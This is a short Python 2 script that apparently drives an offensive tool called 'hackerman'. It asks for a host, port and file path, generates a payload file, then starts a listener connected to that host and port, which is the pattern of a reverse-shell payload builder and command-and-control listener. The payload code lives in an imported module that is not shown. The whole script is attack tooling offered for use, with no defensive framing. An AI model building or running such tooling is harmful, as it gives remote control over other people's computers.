from hackerman import make_payload,make_connection,slow_print

host=raw_input('Host : ')
port=raw_input('PORT : ')
# Path of payload
# EX : /root/Desktop/hacker.py
path=raw_input('PATH : ')
slow_print('[+] Making Your Payload',2)
# For Make Payload
make_payload(host,port,path)
slow_print('\n[+] Done ..',1)
# For Start The Listener
slow_print('\n[!] Start Listener ..',2)
make_connection(host,int(port))
